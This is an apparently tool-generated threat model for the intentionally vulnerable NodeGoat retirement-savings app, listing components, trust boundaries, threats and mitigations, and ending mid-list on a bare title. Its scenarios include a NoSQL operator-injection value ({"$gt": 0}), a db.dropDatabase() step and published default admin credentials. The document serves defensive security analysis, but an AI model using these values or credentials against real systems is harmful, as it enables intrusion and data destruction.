components.name: End User (Browser)
components.description: Employee or attacker using a browser to access the RetireEasy retirement savings web app: logs in, updates profile/contributions, posts memos, browses tutorial pages.

components.name: NodeGoat Express Web App
components.description: Node.js/Express server (server.js) that renders Swig/consolidate HTML views and exposes all application routes: login, signup, logout, dashboard, profile, contributions, benefits, allocations, memos, learn redirect, research and tutorial pages. Mounts body-parser, express-session and an error handler; helmet, csurf and HTTPS are commented out in server.js.
assets: user PII (SSN, DOB, address, bank account and routing numbers)

components.name: Tutorial Router
components.description: Express router mounted at /tutorial that renders static OWASP Top 10 tutorial pages (a1..a10, redos, ssrf) without any authentication.

components.name: Session Handler / Auth Middleware
components.description: SessionHandler providing login, signup, logout, isLoggedInMiddleware and isAdminUserMiddleware. Validates credentials against the users collection via UserDAO; passwords are stored in plaintext with bcrypt hashing commented out. Session cookie secret is hard-coded in config/env/all.js.

components.name: Mongo Data Access Layer (DAOs)
components.description: DAO modules (UserDAO, ProfileDAO, ContributionsDAO, AllocationsDAO, BenefitsDAO, MemosDAO, ResearchDAO) that read and write MongoDB collections users, allocations, contributions and memos using the mongodb 2.x driver. Profile encryption helpers are commented out.
assets: user records with SSN, DOB, bank account and routing numbers

components.name: MongoDB Datastore
components.description: MongoDB database 'nodegoat' holding users, allocations, contributions and memos collections. Connection string comes from MONGODB_URI (defaults to mongodb://localhost:27017/nodegoat); in docker-compose it is mongodb://mongo:27017/nodegoat with no credentials.
assets: SSN, DOB, bank account and routing numbers

components.name: Database Reset/Seed Script
components.description: artifacts/db-reset.js drops and repopulates collections with default accounts (admin/Admin_123, user1, user2) including plaintext passwords; run at container start and on Heroku postdeploy.

components.name: External Stock Quote Fetcher (needle)
components.description: Outbound HTTP fetch performed by the /research handler: it concatenates the user-supplied url and symbol query parameters and issues needle.get, writing the remote body straight into the response (SSRF and reflected content).

components.name: GitHub Actions CI
components.description: CI workflows that check out the repo, install dependencies, start MongoDB in Docker, run the app with NODE_ENV=test and execute Cypress e2e tests and a jshint lint job.

components.name: mongo (compose)
components.description: Deployment target (compose) mongo defined in docker-compose.yml.

components.name: web (compose)
components.description: Deployment target (compose) web defined in docker-compose.yml, ports 4000.

components.name: Dockerfile (dockerfile)
components.description: Deployment target (dockerfile) Dockerfile defined in Dockerfile, ports 4000.

trustBoundaries.name: Public Internet to Express Application
trustBoundaries.description: Unauthenticated browsers reach the Express app over plain HTTP on port 4000; login, signup, logout and all tutorial pages are unauthenticated entry points and helmet/csurf/HTTPS are disabled in server.js.

trustBoundaries.name: Regular User to Administrative Function
trustBoundaries.description: The /benefits screens are intended for admins (isAdmin middleware exists) but are wired with only isLoggedIn, so any authenticated user crosses into administrative functionality.

trustBoundaries.name: Application to MongoDB
trustBoundaries.description: The app and the seed job connect to MongoDB via MONGODB_URI; in docker-compose the connection string carries no credentials and sensitive fields are stored unencrypted.

trustBoundaries.name: Application to External HTTP Endpoint
trustBoundaries.description: The research handler issues server-side HTTP requests to a URL built from user input and returns the remote body to the browser, crossing from the app into arbitrary third-party or internal network destinations.

trustBoundaries.name: CI Pipeline to Running Application
trustBoundaries.description: GitHub Actions builds the repository, starts MongoDB and the application, and exercises it with Cypress, running at a different privilege from the production runtime.

threats.title: Session cookie and rendered PII carried over plaintext HTTP to the browser
threats.asset: session cookie and the SSN, DOB, bank account and routing numbers rendered into profile.html
threats.attackScenario: The HTTPS server setup in server.js:18-28 is commented out and the app is started as plain http (server.js:12, Procfile), so an attacker on the same café or corporate network sniffs the app-render-to-user response carrying the express-session cookie and the /profile page fields (ssn, bankAcc, bankRouting) and replays the cookie to impersonate the victim.
assumptions: No TLS-terminating reverse proxy or load balancer sits in front of the Node process in the deployed environment.
The express-session cookie is not marked secure, so it is transmitted over the plaintext channel.
threats.impactReason: Full account takeover plus disclosure of SSN and banking details in cleartext.
threats.likelihoodReason: Requires network-adjacent position, but no application-level control prevents it and helmet.hsts() is not mounted.

mitigation.summary: Terminate TLS in front of the app and force secure cookies and HSTS.
steps: Re-enable the https server block in server.js:18-28 or document a TLS-terminating proxy and redirect all http traffic to https.
Set cookie: { secure: true, httpOnly: true } on the express-session configuration in server.js.
Uncomment the helmet require at server.js:10 and mount helmet.hsts().

threats.title: Session fixation and unbounded session lifetime on the app-render-to-user response
threats.asset: authenticated user sessions and the PII reachable through them
threats.attackScenario: handleLoginRequest in app/routes/session.js:53 sets req.session.userId on the existing session without regenerating the session id, so an attacker first requests /login to obtain a connect.sid value, plants it in the victim's browser (for example via the open redirect on /learn plus a cookie-setting page on a shared subdomain), and reuses that same id after the victim logs in to read their /profile SSN and bank details.
assumptions: Sessions do not expire on a short inactivity window, so a captured id remains valid.
req.session.regenerate is not called on successful authentication in app/routes/session.js.
threats.impactReason: A fixed or long-lived session id gives full impersonation of the victim including their PII and contribution controls.
threats.likelihoodReason: Requires planting a cookie in the victim's browser, but the app itself never rotates the identifier at login.

mitigation.summary: Regenerate the session on login and bound its lifetime.
steps: Call req.session.regenerate() before assigning req.session.userId in app/routes/session.js:53.
Configure express-session in server.js with a maxAge and rolling expiry, and destroy the session on /logout.

threats.title: No security response headers on rendered HTML enables clickjacking and unrestricted script sources
threats.asset: user actions on /profile and /contributions and the PII those forms carry
threats.attackScenario: Every helmet call is commented out at server.js:38-60 and the layout at app/views/layout.html sets no CSP or frame-ancestors meta, so an attacker frames https://nodegoat.example/profile invisibly on their own page and overlays bait controls to make a logged-in victim submit the profile form with attacker-chosen bank details, while the absence of CSP also removes any fallback against injected script in rendered memo and profile content.
assumptions: No reverse proxy injects X-Frame-Options, Content-Security-Policy or X-Content-Type-Options for responses on the app-render-to-user flow.
threats.impactReason: Clickjacked form submissions can change banking data and the missing CSP removes defence-in-depth against the stored XSS path.
threats.likelihoodReason: Framing requires luring an authenticated victim, but nothing in the application blocks it.

mitigation.summary: Mount helmet with frameguard, CSP and nosniff.
steps: Uncomment the helmet require at server.js:10 and app.use(helmet.frameguard()), helmet.contentSecurityPolicy() and helmet.noSniff() in the block at server.js:38-60.
Also call app.disable("x-powered-by") as the commented code at server.js:42 shows.

threats.title: Stored cross-site scripting through memo text rendered on /memos
threats.asset: session cookies of every user who opens the shared memos page
threats.attackScenario: addMemos inserts req.body.memo unvalidated and unencoded at app/routes/memos.js:13 and displayMemos renders every stored memo back to all users via memosList, so an attacker posts a memo containing to /memos and steals the session cookie of each colleague (including an admin) who later visits /memos.
assumptions: Memo bodies are rendered through the marked/Swig raw path rather than being HTML-escaped by the memos template.
Session cookies are not set httpOnly, so script can read them.
threats.impactReason: A single stored payload executes in every user's browser, including admins, allowing session takeover.
threats.likelihoodReason: Any registered user can post a memo and memos are displayed to all users with no moderation.

mitigation.summary: Escape or sanitise memo content on input and output.
steps: Validate and length-limit req.body.memo in app/routes/memos.js:13 and strip HTML before calling memosDAO.insert.
Ensure the memos Swig template uses escaped interpolation ({{ memo }}), never the `| safe` or marked raw filter.
Set httpOnly and secure on the express-session cookie in server.js and add helmet.contentSecurityPolicy().

threats.title: Error handler renders exception messages and stack contents to the browser
threats.asset: internal file paths, Mongo driver error details and library versions leaked in error pages
threats.attackScenario: The error middleware at app/routes/error.js:10-12 passes the whole err object into the error-template view, so an attacker triggers a handler failure — for example by posting a malformed bankRouting value to /profile or a non-numeric threshold to /allocations/:userId — and reads the returned error message and stack details to map the server's file layout and database driver.
assumptions: The error-template view renders the passed error's message/stack rather than discarding it.
threats.impactReason: Leaked paths and versions aid further exploitation but disclose no user records directly.
threats.likelihoodReason: Errors are easy to trigger from unvalidated route parameters on routes any logged-in user can reach.

mitigation.summary: Return a generic error page and keep details server-side only.
steps: In app/routes/error.js, render error-template with a static message and log err.stack to the server log only.
Gate any detailed output behind process.env.NODE_ENV !== 'production'.

threats.title: CI drives the app over plain HTTP, exposing session cookies and PII on the ci-to-app flow
threats.asset: session cookies and the profile PII (SSN, DOB, bank account and routing numbers) submitted by the e2e specs
threats.attackScenario: The ci-to-app flow is declared as HTTP and server.js keeps the HTTPS bootstrap commented out at lines 18-28, so any process sharing the runner's network namespace captures the Cypress POST /login and POST /profile requests and reads the connect.sid cookie plus the SSN and bank routing values in the request bodies, then replays the cookie against the running instance.
assumptions: No TLS terminator is placed in front of the app instance started by the CI job.
Traffic on the flow is observable by a process or job other than the Cypress runner.
threats.impactReason: Cleartext session cookies allow session takeover of the test instance and expose the PII fields the specs submit.
threats.likelihoodReason: Observing loopback CI traffic requires an existing foothold on the runner, which the untrusted-PR path could supply.

mitigation.summary: Terminate TLS for the application and mark session cookies secure.
steps: Re-enable the https.createServer path commented out in server.js lines 18-28 for non-test deployments and front the CI instance with HTTPS or keep it strictly on loopback.
Set `cookie: { secure: true, httpOnly: true, sameSite: 'lax' }` on the express-session configuration in server.js.

threats.title: Unauthenticated actor on the CI network reaches the app started on the runner and drives its state-changing routes
threats.asset: test-instance user records and contribution/allocation data in the CI MongoDB
threats.attackScenario: The ci-to-app flow starts the NodeGoat app with `NODE_ENV=test npm start` and drives it over plain HTTP from Cypress, while the state-changing handlers reached over that flow (POST /profile at app/routes/index.js:48, POST /contributions at :52, POST /benefits at :56, POST /memos at :67) are flagged as lacking an authentication check, so any process co-located on the runner or any request reaching the exposed port posts directly to /benefits or /memos and rewrites benefit start dates and memo content without ever logging in.
assumptions: The app started by the CI job listens on an interface reachable by processes other than the Cypress runner.
threats.impactReason: State-changing endpoints carrying profile PII, contributions and benefits can be driven without credentials in the test instance, and the same route table ships to production deployments.
threats.likelihoodReason: Reaching the CI-hosted instance requires a foothold on the runner or on a co-located job, which is not open to an anonymous internet attacker.

mitigation.summary: Enforce an authentication check on every state-changing route and keep the CI instance bound to localhost.
steps: Confirm `isLoggedIn` is applied to each POST handler registered in app/routes/index.js lines 48, 52, 56 and 67, and add `isAdmin` to the /benefits routes as the commented fix at lines 57-60 shows.
Bind the server started by `NODE_ENV=test npm start` to 127.0.0.1 in server.js so the CI instance is not reachable from other hosts.

threats.title: Open redirect on GET /learn reached over the CI-driven HTTP flow takes its target straight from the query string
threats.asset: session cookies and user credentials of anyone following a crafted /learn link
threats.attackScenario: The handler registered at app/routes/index.js:70 does `res.redirect(req.query.url)` with no validation of the url parameter, so an attacker sends a victim a link to /learn?url=https://attacker.example/login that the application itself issues a 302 to, and harvests credentials on a look-alike login page; the same unvalidated parameter is exercised over the ci-to-app HTTP flow during e2e runs.
assumptions: No allowlist of redirect destinations is applied in middleware upstream of the /learn handler.
No input validation is applied to GET /learn, so any input it reads is used unvalidated.
threats.impactReason: A redirect from the application's own origin lends credibility to a phishing page that captures login credentials and, with them, the SSN and bank data behind /profile.
threats.likelihoodReason: The parameter is fully attacker-controlled and needs only a logged-in victim to click the link. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate the /learn redirect target against an allowlist.
steps: Replace `res.redirect(req.query.url)` at app/routes/index.js:72 with a lookup of a fixed map of permitted learning-resource URLs keyed by an opaque id.
Reject or 400 any url value whose parsed host is not in the allowlist before redirecting.

threats.title: DAO-to-MongoDB traffic carries SSN, bank details and plaintext passwords over an unauthenticated, unencrypted wire connection
threats.asset: user records with SSN, DOB, bank account and routing numbers and plaintext passwords in transit
threats.attackScenario: The connection string at config/env/all.js:3 and docker-compose.yml:8 is `mongodb://mongo:27017/nodegoat` with no credentials and no tls option, so an attacker with a foothold on the compose network sniffs the MongoDB wire protocol frames carrying UserDAO inserts and ProfileDAO updates to read SSN, bankRouting and cleartext passwords, or simply connects to the mongo service itself and issues arbitrary reads and writes against the users collection.
assumptions: The MongoDB deployment uses the URI from config/env/all.js or docker-compose.yml unchanged, with no TLS and no authentication enabled on the server.
threats.impactReason: Full identity and banking data plus credentials for every user are exposed and modifiable on the wire and at the server.
threats.likelihoodReason: Needs network adjacency to the mongo service, which is reachable from any co-located container or compromised sidecar.

mitigation.summary: Require authentication and TLS on the MongoDB connection used by the DAOs.
steps: Set MONGODB_URI to include a dedicated least-privilege user and `?tls=true` and remove the hardcoded fallback in config/env/all.js:3.
Enable authorization and TLS on the mongo service in docker-compose.yml and stop exposing it without credentials.
Pass the CA/cert options to the driver connect call so the certificate is verified rather than accepted blindly.

threats.title: Unauthenticated reset/seed path on the DAO-to-Mongo connection can wipe collections
threats.asset: the users, allocations, contributions and memos collections
threats.attackScenario: docker-compose.yml:9 runs `node artifacts/db-reset.js` against the same credential-free mongodb://mongo:27017/nodegoat connection before every `npm start`, so any restart of the web container — or an attacker who can trigger one — drops and reseeds the users, allocations and contributions collections, destroying real account, benefit and contribution data.
assumptions: The same compose command is used in the deployed environment rather than only locally, and db-reset.js clears existing collections.
threats.impactReason: All persisted user, allocation, contribution and memo data is destroyed and replaced with seed fixtures.
threats.likelihoodReason: Requires the compose definition to be used in a live environment or the ability to restart the container.

mitigation.summary: Keep the database reset job out of the production start path.
steps: Remove `node artifacts/db-reset.js` from the web service command in docker-compose.yml:9 and gate it behind NODE_ENV=test in a separate compose override.
Grant the application's MongoDB user no drop/dropDatabase privileges on the nodegoat database.
Add a guard at the top of artifacts/db-reset.js that exits unless NODE_ENV is test or development.

threats.title: UserDAO stores registration passwords in plaintext in the users collection
threats.asset: user account passwords
threats.attackScenario: app/data/user-dao.js:17-31 builds the user document with `password` taken straight from the request parameter while the bcrypt hashing line is left commented out, so anyone who obtains a dump of the `users` collection (or reaches any query path returning a user document) reads every account's cleartext password and replays it against the login route and against users' other services.
assumptions: The commented-out bcrypt.hashSync branch in app/data/user-dao.js is the only hashing logic and no hashing happens elsewhere before insert.
threats.impactReason: Every user's password is recoverable verbatim, enabling account takeover in this app and credential stuffing elsewhere.
threats.likelihoodReason: The weakness is unconditional on every registration; exploitation only needs read access to the users collection or any endpoint echoing user documents.

mitigation.summary: Hash passwords with bcrypt before insert and verify with bcrypt.compare on login.
steps: In app/data/user-dao.js addUser, replace `password` with `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` using the already-required bcrypt-nodejs module.
Change validateLogin's comparePassword to use bcrypt.compareSync(fromUser, fromDB).
Add a one-off migration that rehashes or invalidates existing plaintext passwords and forces a reset.

threats.title: Unvalidated userId passed into DAO query filters allows NoSQL operator injection and cross-user writes
threats.asset: other users' allocations and contributions records
threats.attackScenario: ContributionsDAO.update at app/data/contributions-dao.js:28 filters on the raw `userId` value (not the parsedUserId it computed) with `upsert: true`, so a caller that supplies a non-numeric or object-shaped userId — for example `{"$gt": 0}` from a request body parsed by body-parser — matches or creates documents outside their own record and overwrites another user's preTax/afterTax/roth contributions.
assumptions: No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
The userId value reaches the DAO from request input without being coerced to an integer or scoped to the session user upstream.
threats.impactReason: Financial allocation and contribution records for arbitrary users can be read or overwritten.
threats.likelihoodReason: Any authenticated user can supply the userId field, though it depends on the route not coercing the value first. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Coerce and validate userId to an integer inside every DAO and take it from the session, not the request.
steps: In app/data/contributions-dao.js:28 use `{ userId: parsedUserId }` as the filter and reject NaN before querying.
Apply the same coercion in app/data/allocations-dao.js update and getByUserIdAndThreshold.
Derive userId from the server-side session in the callers rather than accepting it from the request body.

threats.title: DAO writes to users, allocations and contributions leave no audit record
threats.asset: integrity record of changes to benefit start dates and financial allocations
threats.attackScenario: BenefitsDAO.updateBenefits at app/data/benefits-dao.js:23 overwrites any user's benefitStartDate by _id and only emits `console.log("Updated benefits")` with no actor, target id or previous value, so an admin-role attacker alters another employee's benefit start date and later denies it because nothing in the datastore or logs ties the change to them.
assumptions: No separate audit-log middleware records DAO mutations outside app/data/.
threats.impactReason: Financial and benefit record changes cannot be attributed or reconstructed after the fact.
threats.likelihoodReason: Any caller of the benefits or allocations update path produces an unattributed write; no special skill is needed.

mitigation.summary: Record an attributable audit entry for every mutating DAO operation.
steps: In app/data/benefits-dao.js updateBenefits and app/data/allocations-dao.js update, write an audit document containing acting user id, target user id, old and new values, and timestamp.
Replace the bare console.log calls with structured log lines that include the acting session user id.
Make the audit collection append-only at the database-role level.

threats.title: ProfileDAO writes SSN, DOB and bank routing details to MongoDB unencrypted
threats.asset: user SSN, date of birth, bank account and routing numbers
threats.attackScenario: app/data/profile-dao.js:15-40 has the entire crypto encrypt/decrypt helper block commented out, and updateUser at line 42 assigns ssn, dob, bankAcc and bankRouting straight into the users document, so an attacker with any read path to the `users` collection (a Mongo dump, a backup file, or an endpoint returning a profile) harvests full identity and banking records in cleartext.
assumptions: No field-level or storage-level encryption is applied to the users collection outside app/data/profile-dao.js.
threats.impactReason: SSN, DOB and bank account/routing numbers are directly usable for identity theft and fraud.
threats.likelihoodReason: Requires read access to the users collection or a profile-returning route, but the data is stored cleartext in every case.

mitigation.summary: Encrypt sensitive profile fields before persisting them.
steps: Re-enable the crypto helpers in app/data/profile-dao.js, using crypto.createCipheriv with a per-record random IV stored alongside the ciphertext rather than on the shared config object.
Move the key out of config/env/all.js into an environment variable and rotate the committed value.
Encrypt ssn, dob, bankAcc and bankRouting in updateUser and decrypt in getUser.

threats.title: Vulnerable mongodb 2.2.36 driver used by all DAOs is subject to a denial-of-service advisory
threats.asset: availability of all DAO-backed data access (users, allocations, contributions, memos)
threats.attackScenario: Every DAO in app/data/ is built on the mongodb 2.2.36 driver pinned at package.json:18, which GHSA-mh5c-679w-hh4r reports as denial-of-service affected (fixed in 3.1.13), so an attacker sends crafted input that reaches a DAO call such as MemosDAO.getAllMemos or UserDAO.getUserById and stalls or crashes the driver's connection handling, taking down all database-backed pages.
threats.impactReason: Loss of the database layer makes login, profile, allocations and memos all unavailable until the process is restarted.
threats.likelihoodReason: The vulnerable version is pinned and reachable from user-facing routes, but exploitation needs the specific advisory trigger.

mitigation.summary: Upgrade the mongodb driver past the fixed version.
steps: Raise the mongodb dependency in package.json:18 to at least 3.1.13 (preferably a current 4.x/5.x line).
Adapt the DAO call sites in app/data/*.js to the newer driver's promise-based collection API (insertOne/updateOne/findOne return values).
Add an automated dependency audit step to CI so future advisories fail the build.

threats.title: Seed script writes plaintext credentials and PII to MongoDB over an unauthenticated, unencrypted wire connection
threats.asset: seeded account credentials and stored user PII (SSN, DOB, bank account and routing numbers)
threats.attackScenario: docker-compose.yml line 8 sets MONGODB_URI to mongodb://mongo:27017/nodegoat with no username, password or TLS parameters, and config/env/all.js line 3 falls back to the same credential-free localhost URI, so an attacker with a foothold on the container network sniffs or connects directly to port 27017 and reads or rewrites the user documents that db-reset.js inserts across the seed-to-mongo flow.
assumptions: The deployed MongoDB instance accepts the connection string as written, without server-side authentication or TLS enforcement.
threats.impactReason: Direct read/write access to the nodegoat database exposes every user's credentials, SSN, DOB and bank account and routing numbers.
threats.likelihoodReason: Requires network adjacency to the mongo service, but no credential is needed once there and the port is exposed to the compose network.

mitigation.summary: Require authenticated, TLS-protected MongoDB connections for the seed job.
steps: Create a dedicated MongoDB user and set MONGODB_URI in docker-compose.yml to mongodb://user:pass@mongo:27017/nodegoat?tls=true&authSource=admin.
Start the mongo:4.4 service with --auth and a TLS certificate in docker-compose.yml.
Remove the credential-free default in config/env/all.js line 3 and fail startup when MONGODB_URI is unset.

threats.title: Seed job installs well-known default accounts including an admin with a fixed password
threats.asset: the admin account of the nodegoat application
threats.attackScenario: artifacts/db-reset.js:12-37 inserts _id 1 'admin' with isAdmin true and a constant password documented in the adjacent comment, so an attacker who knows the public NodeGoat fixture simply logs in at /login as admin with Admin_123 and gains administrative access to every user's profile, SSN, DOB and bank details.
assumptions: The seeded admin credentials are not rotated or removed after deployment.
threats.impactReason: Administrative access exposes every user's SSN, DOB and bank account and routing numbers.
threats.likelihoodReason: The credentials are published in the project's own source, so any unauthenticated stranger can try them against the login form.

mitigation.summary: Stop seeding fixed-credential privileged accounts in any deployable environment.
steps: Generate the admin password at seed time from a required environment variable and fail if it is unset, in artifacts/db-reset.js.
Hash seeded passwords with the bcrypt-nodejs dependency already in package.json before insertion.
Remove the plaintext password comments at artifacts/db-reset.js:19, 28 and 36.

threats.title: Seed script drops production collections on every container start and Heroku postdeploy
threats.asset: live user, allocations and contributions collections in the nodegoat database
threats.attackScenario: docker-compose.yml line 9 runs `node artifacts/db-reset.js` before `npm start` and app.json line 13 wires the same script to Heroku `postdeploy` with NODE_ENV=production, so anyone able to trigger a redeploy or container restart causes tryDropCollection (artifacts/db-reset.js:39) to drop the live collections and replace them with the three fixed accounts, destroying all real user records.
assumptions: The deployed environment uses docker-compose.yml or the Heroku app.json postdeploy hook against the same MONGODB_URI that serves live data.
threats.impactReason: All persisted user, benefit and contribution data is destroyed and replaced with fixture data, an unrecoverable availability and integrity loss.
threats.likelihoodReason: No attacker action is even required beyond causing a restart or redeploy; the destructive path runs unconditionally on the normal startup command.

mitigation.summary: Gate the reset/seed script so it can never run against a non-development database.
steps: Add an explicit guard at the top of artifacts/db-reset.js that exits unless NODE_ENV is 'development' or 'test', or unless an explicit ALLOW_DB_RESET flag is set.
Remove `node artifacts/db-reset.js &&` from the web service command in docker-compose.yml and remove the `postdeploy` script from app.json for production deployments.
Move seeding behind the existing `npm run db:seed` script which already pins NODE_ENV=test.

threats.title: Seed job writes no audit record of collection drops and reseeds
threats.asset: integrity record of the nodegoat user collection
threats.attackScenario: artifacts/db-reset.js only prints to stdout via console.log in tryDropCollection and parseResponse, so an operator who runs `node artifacts/db-reset.js` against the production MONGODB_URI to wipe evidence of account tampering leaves no durable, attributable record linking the destruction of the users collection to them.
assumptions: Container stdout is not shipped to a retained, tamper-resistant log store.
threats.impactReason: Destructive database changes cannot be attributed, hampering incident response after a data-wiping event.
threats.likelihoodReason: Anyone with shell or deploy access can invoke the script, and it is invoked routinely so ordinary runs are indistinguishable from malicious ones.

mitigation.summary: Emit an attributable audit event whenever the reset script drops or repopulates collections.
steps: Write a structured log entry containing the invoking OS user, NODE_ENV, target database host and timestamp to a persistent sink at the start and end of artifacts/db-reset.js.
Fail the script if the audit sink is unavailable rather than silently proceeding.

threats.title: Seeded user documents carry passwords that the seed flow never hashes
threats.asset: seeded default credentials stored in the users collection
threats.attackScenario: The USERS_TO_INSERT array in artifacts/db-reset.js:12-37 carries a literal `password` field per account with the cleartext value repeated in the adjacent comments, and no hashing call appears before the documents cross the seed-to-mongo flow, so an attacker who obtains a Mongo dump or a backup reads the admin and user1/user2 passwords directly and reuses them against the login form and any shared credentials.
assumptions: No hashing step is applied to the password field elsewhere in artifacts/db-reset.js before insertion.
threats.impactReason: Recovered credentials grant direct application login, including the isAdmin account, with no cracking effort.
threats.likelihoodReason: Requires access to a database dump or the datastore itself, which the unauthenticated Mongo configuration makes attainable from the container network.

mitigation.summary: Hash seeded passwords with bcrypt before they reach MongoDB.
steps: Import bcrypt-nodejs, already declared in package.json, in artifacts/db-reset.js and replace each literal password with bcrypt.hashSync(value, bcrypt.genSaltSync()).
Delete the commented cleartext passwords at artifacts/db-reset.js:19, 28 and 36.

threats.title: Unauthenticated MongoDB on the compose network can be denied service by dropping the nodegoat database
threats.asset: availability of the nodegoat MongoDB data store
threats.attackScenario: Because the mongo service at docker-compose.yml:13 exposes 27017 on the compose network without any credential configuration, an attacker with a foothold in a sibling container issues db.dropDatabase() against nodegoat or opens enough idle connections to exhaust the container's connection pool, taking the web service offline.
assumptions: No volume-backed backup of the nodegoat database exists to restore from.
The mongo:4.4 container runs without --auth and without a connection or resource limit.
threats.impactReason: Loss of the entire application data set with no declared volume or backup in the compose file.
threats.likelihoodReason: Needs network access inside the compose project, but the destructive command requires no authentication once there.

mitigation.summary: Authenticate MongoDB clients and constrain its resources and persistence.
steps: Enable --auth on the mongo service and grant the application user only readWrite on nodegoat, not dbAdmin.
Attach a named volume to /data/db in docker-compose.yml so data survives container loss.
Set maxIncomingConnections and container memory/CPU limits on the mongo service.

threats.title: Web container start command retries a database reset script in a loop, allowing repeated wipe of seeded data and startup failure loops
threats.asset: availability and integrity of the seeded nodegoat application data
threats.attackScenario: The web service command at docker-compose.yml:9 runs `node artifacts/db-reset.js && npm start` inside an `until ... do sleep 2; done` loop, so anyone who can crash the Node process (or restart the container) causes db-reset.js to run again and overwrite live collections in the nodegoat database with seed data.
assumptions: The same compose definition is used outside a throwaway demo environment.
artifacts/db-reset.js drops and reseeds collections rather than being a no-op on an already-initialised database.
threats.impactReason: Every record written since the last container start is destroyed by the reset.
threats.likelihoodReason: Requires the container to restart or the process to crash, which an attacker can often induce but does not control directly.

mitigation.summary: Separate one-time database seeding from the application start command.
steps: Remove `node artifacts/db-reset.js` from the web service command in docker-compose.yml and run it as an explicit one-off task or init container.
Guard artifacts/db-reset.js so it refuses to run when NODE_ENV is production or when the target collections are non-empty.

threats.title: Web container publishes port 4000 to all host interfaces with NODE_ENV unset, exposing development-mode responses
threats.asset: application stack traces, configuration details and internal error output
threats.attackScenario: docker-compose.yml:10-11 binds "4000:4000" on every host interface while line 7 declares NODE_ENV with no value, so a remote attacker reaches http://<host>:4000 directly and triggers an error route to collect development-mode stack traces and framework internals that would be suppressed in production mode.
assumptions: NODE_ENV is not supplied from the host environment, so the application falls back to development behaviour.
The host running compose is reachable from an untrusted network with no firewall in front of port 4000.
threats.impactReason: Leaked stack traces and configuration aid follow-on attacks against the application but are not themselves the crown jewels.
threats.likelihoodReason: The published port is reachable by any network peer of the host and needs no authentication to probe.

mitigation.summary: Pin NODE_ENV to production and bind the published port to loopback or a reverse proxy.
steps: Set NODE_ENV: production explicitly on the web service in docker-compose.yml instead of leaving it blank.
Change the port mapping to "127.0.0.1:4000:4000" and place a TLS-terminating reverse proxy in front of it.

threats.title: Container image built on end-of-life node:12-alpine base carries unpatched runtime CVEs
threats.asset: the running application container and the data it serves on port 4000
threats.attackScenario: The Dockerfile pins FROM node:12-alpine at Dockerfile:1 and Dockerfile:7, a Node.js release that no longer receives security fixes, so an attacker fingerprints the Node version from the service exposed on port 4000 and drives a known unpatched Node/OpenSSL or Alpine package CVE to crash or execute code inside the container.
assumptions: The image is built from this Dockerfile as-is and deployed without an additional base-image patching step.
threats.impactReason: A runtime-level CVE in the base image affects the whole application process and any secrets or data it holds.
threats.likelihoodReason: The base tag is floating on an EOL major version, and exploits for known Node 12 / Alpine CVEs are public, though exploitation still requires a reachable vulnerable code path.

mitigation.summary: Move the image to a currently supported Node LTS base and pin it by digest.
steps: Replace `FROM node:12-alpine` on Dockerfile:1 and Dockerfile:7 with a supported LTS tag (e.g. node:20-alpine) pinned by sha256 digest.
Add a scheduled image rebuild plus a container scan (e.g. Trivy or `docker scout`) to the existing GitHub Actions setup so base CVEs are surfaced.
Verify the application's package.json engines field matches the new Node major before merging.

threats.title: Production hardening of the app directory is left commented out in the Dockerfile
threats.asset: application source and node_modules inside the container filesystem
threats.attackScenario: Dockerfile:15 leaves the `chmod -R g-s,o-rx /home/$USER && chmod -R o-wrx $WORKDIR` hardening commented out while Dockerfile:13 copies the whole build context in with only `--chown=node`, so an attacker who obtains any non-node process or shell in the container (for example through a dependency RCE in the service on port 4000) can read and overwrite application files and node_modules to persist a backdoor across restarts of the same container.
assumptions: The container is not run with a read-only root filesystem.
The image is shipped to production without uncommenting Dockerfile:15 or applying equivalent permissions elsewhere.
threats.impactReason: Writable application code in the container allows code modification and persistence, but only after an attacker already has execution inside the container.
threats.likelihoodReason: Requires a prior foothold in the container; the permission weakness alone is not remotely reachable.

mitigation.summary: Apply the intended file-permission hardening at build time instead of leaving it commented.
steps: Uncomment and keep the RUN chmod line at Dockerfile:15 so $WORKDIR is not world-readable/writable.
Run the container with a read-only root filesystem and an explicit writable tmpfs for any scratch paths.
Use a .dockerignore so .git, local .env files and test fixtures are never copied by the `COPY --chown=node . $WORKDIR` on Dockerfile:13.

threats.title: E2E workflow triggers on pull_request with unpinned third-party actions
threats.asset: the CI runner for the e2e-test job and the build artifacts/npm cache it produces
threats.attackScenario: The e2e-test job at .github/workflows/e2e-test.yml:5 runs on every `push` and `pull_request` and pulls actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 by mutable tag rather than commit SHA, so an attacker who compromises one of those action repositories or their tags retags the reference and executes arbitrary code on the ubuntu-latest runner during any contributor's pull request build.
assumptions: The repository does not enforce a global allow-list or SHA-pinning policy for actions at the organisation level.
threats.impactReason: Runner compromise gives arbitrary code execution in CI and access to the restored ~/.npm and ~/.cache contents, though the checkout step sets persist-credentials: false so the GITHUB_TOKEN is not written to the git config.
threats.likelihoodReason: Requires compromise of a widely watched upstream action or its tag; the trigger surface itself is wide open to any fork PR.

mitigation.summary: Pin all third-party actions to full commit SHAs and upgrade the deprecated action versions.
steps: Replace actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 in .github/workflows/e2e-test.yml with current major versions pinned to full 40-character commit SHAs.
Add an explicit top-level `permissions: contents: read` block to the workflow so the job token is least-privileged.
Enable Dependabot for github-actions so pinned SHAs are updated with review.

threats.title: Unbounded pull_request CI matrix allows runner-minute exhaustion
threats.asset: GitHub Actions runner capacity for the repository
threats.attackScenario: The workflow at .github/workflows/e2e-test.yml:2 triggers on `pull_request` with a three-entry node-version matrix and `fail-fast: false`, and no concurrency group is declared, so an attacker opens a fork pull request and force-pushes repeatedly to spawn three full `npm ci` jobs per push that queue up and starve legitimate builds of runner minutes.
assumptions: The repository does not require maintainer approval before running workflows for first-time or fork contributors.
threats.impactReason: Impact is limited to CI availability and billed runner minutes; no application data is reached.
threats.likelihoodReason: Anyone with a GitHub account can open and repeatedly update a fork pull request against a public repository.

mitigation.summary: Add a concurrency group that cancels superseded runs and require approval for fork workflows.
steps: Add a `concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true }` block to .github/workflows/e2e-test.yml.
In repository Settings > Actions, require approval for all outside-collaborator workflow runs.
Add a `timeout-minutes` to the e2e-test job so stuck runs release the runner.

threats.title: Lint workflow runs an unpinned remote linter fetched at build time
